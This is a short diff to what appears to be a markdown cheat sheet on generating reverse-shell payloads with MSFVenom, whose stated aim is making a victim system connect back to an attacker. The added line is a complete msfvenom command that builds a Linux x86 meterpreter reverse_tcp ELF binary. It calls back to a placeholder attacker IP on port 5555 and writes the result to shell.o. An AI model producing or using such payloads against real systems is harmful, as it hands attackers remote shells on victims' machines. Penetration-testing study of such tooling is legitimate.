@@ -10,3 +10,5 @@ To make the victim server or system connect back to the attacker and send meterp
 
 ## LINUX
 This section is for all LINUX binary creation techniques used with MSFVenom
+
+`./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=5555 -a x86 --platform=linux -f elf -b '\x00' -o shell.o`
